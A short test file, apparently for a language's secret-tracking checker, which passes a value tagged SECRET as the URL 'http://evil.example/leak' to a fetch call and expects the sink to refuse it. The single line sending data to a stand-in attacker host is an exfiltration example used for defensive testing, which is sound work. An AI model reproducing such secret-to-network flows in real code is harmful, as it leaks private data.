// # Refuse a secret fetch URL
//
// Logline: A tagged URL must not reach fetch.
//
// Beats:
//   1. Tag token at line start.
//   2. Pass that name as the URL.
//   3. Expect the sink to refuse.

// M131: Secret URL must not reach fetch
// SECRET: token
pub fn main(net: &NetCap) {
    let token = "http://evil.example/leak";
    let r = fetch(net, token);
    println(1);
}
